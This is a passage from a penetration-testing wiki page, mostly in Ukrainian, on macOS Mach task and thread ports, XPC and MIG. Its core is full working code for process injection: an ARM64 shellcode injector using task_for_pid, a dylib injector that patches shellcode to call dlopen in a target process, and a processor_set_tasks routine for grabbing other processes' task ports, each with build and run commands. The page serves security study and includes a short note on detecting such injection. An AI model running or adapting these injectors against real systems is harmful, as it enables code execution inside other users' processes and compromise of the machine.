**Порт імені завдання:** Непривілейована версія _порту завдання_. Він посилається на завдання, але не дозволяє його керувати. Єдине, що, здається, доступне через нього, це `task_info()`.

### Порти потоків

У потоків також є пов'язані порти, які видно з завдання, що викликає **`task_threads`**, та від процесора за допомогою `processor_set_threads`. Право на відправку до порту потоку дозволяє використовувати функції підсистеми `thread_act`, такі як:

* `thread_terminate`
* `thread_[get/set]_state`
* `act_[get/set]_state`
* `thread_[suspend/resume]`
* `thread_info`
* ...

Будь-який потік може отримати цей порт, викликавши **`mach_thread_sef`**.

### Впровадження шелл-коду в потік через порт завдання

Ви можете отримати шелл-код з:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %} {% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Скомпілюйте** попередню програму та додайте **привілеї**, щоб мати можливість впроваджувати код з тим самим користувачем (якщо ні, вам доведеться використовувати **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
{% hint style="success" %}
Для того, щоб це працювало на iOS, вам потрібно мати entitlement `dynamic-codesigning`, щоб мати можливість робити запис пам'яті виконуваною.
{% endhint %}

### Впровадження Dylib у потік через порт завдання

У macOS **потоки** можуть бути маніпульовані через **Mach** або за допомогою **posix `pthread` api**. Потік, який ми створили у попередньому впровадженні, був створений за допомогою Mach api, тому **він не є сумісним з posix**.

Було можливо **впровадити простий шелл-код**, щоб виконати команду, оскільки **не потрібно було працювати з posix** сумісними api, тільки з Mach. **Більш складні впровадження** потребують, щоб **потік** також був **сумісним з posix**.

Отже, для **покращення потоку** його слід викликати **`pthread_create_from_mach_thread`**, який створить **дійсний pthread**. Потім цей новий pthread може **викликати dlopen**, щоб **завантажити dylib** з системи, тому замість написання нового шелл-коду для виконання різних дій можна завантажити власні бібліотеки.

Ви можете знайти **приклади dylibs** в (наприклад, той, який генерує журнал, і ви можете його прослуховувати):

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Неможливо встановити дозволи пам'яті для коду віддаленого потоку: Помилка %s\n", mach_error_string(kr));
return (-4);
}

// Встановлення дозволів на виділену пам'ять стеку
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Неможливо встановити дозволи пам'яті для стеку віддаленого потоку: Помилка %s\n", mach_error_string(kr));
return (-4);
}


// Створення потоку для виконання shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // це справжній стек
//remoteStack64 -= 8;  // потрібне вирівнювання 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Віддалений стек 64  0x%llx, Віддалений код %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Неможливо створити віддалений потік: помилка %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Використання: %s _pid_ _дія_\n", argv[0]);
fprintf (stderr, "   _дія_: шлях до dylib на диску\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib не знайдено\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Захоплення потоку через порт завдання <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

У цій техніці захоплюється потік процесу:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

### Виявлення впровадження порту завдання

При виклику `task_for_pid` або `thread_create_*` лічильник у структурі завдання з ядра збільшується, і його можна отримати з режиму користувача, викликаючи task\_info(task, TASK\_EXTMOD\_INFO, ...)

## Порти винятків

Коли в потоці виникає виняток, цей виняток надсилається на призначений порт винятків потоку. Якщо потік не обробляє його, тоді він надсилається на порти винятків завдання. Якщо завдання не обробляє його, тоді воно надсилається на порт хоста, яким управляє launchd (де воно буде визнано). Це називається вибірковим вибором винятків.

Зверніть увагу, що в кінці звичайно, якщо не обробити правильно, звіт буде оброблений демоном ReportCrash. Однак інший потік у тому ж завданні може обробити виняток, це те, що роблять інструменти звітування про збій, наприклад `PLCrashReporter`.

## Інші об'єкти

### Годинник

Будь-який користувач може отримати доступ до інформації про годинник, однак для встановлення часу або зміни інших параметрів потрібні права root.

Для отримання інформації можна викликати функції з підсистеми `clock`, такі як: `clock_get_time`, `clock_get_attributtes` або `clock_alarm`\
Для зміни значень можна використовувати підсистему `clock_priv` з функціями, такими як `clock_set_time` та `clock_set_attributes`

### Процесори та набір процесорів

API процесора дозволяє керувати одним логічним процесором, викликаючи функції, такі як `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Більше того, API **набору процесорів** надає можливість групувати кілька процесорів у групу. Можливо отримати типовий набір процесорів, викликавши **`processor_set_default`**.\
Ось деякі цікаві API для взаємодії з набором процесорів:

* `processor_set_statistics`
* `processor_set_tasks`: Повертає масив прав на відправку до всіх завдань всередині набору процесорів
* `processor_set_threads`: Повертає масив прав на відправку до всіх потоків всередині набору процесорів
* `processor_set_stack_usage`
* `processor_set_info`

Як зазначено в [**цьому пості**](https://reverse.put.as/2014/05/05/about-the-processor\_set\_tasks-access-to-kernel-memory-vulnerability/), раніше це дозволяло обійти зазначену вище захист, щоб отримати порти завдань в інших процесах для їх керування, викликавши **`processor_set_tasks`** та отримуючи порт хоста на кожному процесі.\
Зараз для використання цієї функції потрібні права root, і це захищено, тому ви зможете отримати ці порти лише на незахищених процесах.

Спробуйте це:

<details>

<summary><strong>Код processor_set_tasks</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## References

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
* [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
